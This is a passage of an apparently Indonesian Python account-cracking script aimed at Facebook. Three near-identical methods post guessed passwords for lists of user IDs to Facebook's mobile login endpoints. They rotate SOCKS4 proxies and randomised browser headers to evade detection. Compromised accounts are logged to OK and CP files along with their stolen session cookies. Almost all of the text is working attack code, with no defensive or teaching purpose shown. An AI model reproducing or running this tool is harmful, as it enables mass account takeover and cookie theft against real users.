2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="{str(rr(8,99))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('╭────────────────────────────╮')
				tree = Tree('')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				print('╰────────────────────────────╯')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print('╭────────────────────────────╮')
				tree = Tree("")
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
				print('╰────────────────────────────╯')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ METODE-ASYINC ]----------#		
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[green]asyinc.facebook.com[white] {loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="{str(rr(8,99))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "m.facebook.com","content-length": f"{len(str(dataa))}","x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "*/*","x-requested-with": "com.microsoft.bing","sec-ch-ua": '"Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Not;A=Brand";v="{str(rr(8,99))}.0.0.0"',"sec-ch-ua-platform": '"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('╭────────────────────────────╮')
				tree = Tree('')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				print('╰────────────────────────────╯')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print('╭────────────────────────────╮')
				tree = Tree("")
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
				print('╰────────────────────────────╯')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ HOST-M-BETA ]----------#		
def metod4(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"[green]m.beta.facebook.com[white] {loop}/{len(id)} OK-:[green]{ok}[/] CP-:[yellow]{cp}[/]")
	prog.advance(des) 
	ua = random.choice(ugen)
	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.beta.facebook.com/?locale=id_ID&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.beta.facebook.com/login/save-device/?login_source=login","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="112"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('╭────────────────────────────╮')
				tree = Tree('')
				tree.add(f'{kun}{idf}{x}').add(f'{kun}{pw}{x}')
				tree.add(f'{mer}{ua}{x}')
				print('╰────────────────────────────╯')
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print('╭────────────────────────────╮')
				tree = Tree("")
				tree.add(f'{hijo}{idf}{x}').add(f'{hijo}{pw}{x}')
				tree.add(f'{hijo}{kuki}{x}').add(f'{mer}{ua}{x}')
				print('╰────────────────────────────╯')
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
			
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
